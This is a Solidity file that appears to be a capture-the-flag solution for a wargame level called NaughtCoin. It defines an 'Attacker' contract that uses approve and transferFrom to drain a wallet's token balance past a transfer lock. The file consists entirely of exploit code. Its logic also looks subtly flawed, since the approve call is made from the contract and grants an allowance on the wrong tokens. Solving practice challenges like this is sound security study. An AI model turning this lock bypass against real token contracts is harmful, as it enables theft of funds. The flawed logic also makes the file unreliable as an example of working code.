// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level15.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract Attacker 
{
    NaughtCoin level15;
    constructor(address _level15)
    {
        level15 = NaughtCoin(_level15);
    }

    function exploit(address my_wallet) external 
    {
        uint my_balance = level15.balanceOf(my_wallet);
        level15.approve(my_wallet, my_balance);
        level15.transferFrom(my_wallet, address(level15), my_balance);
    }
}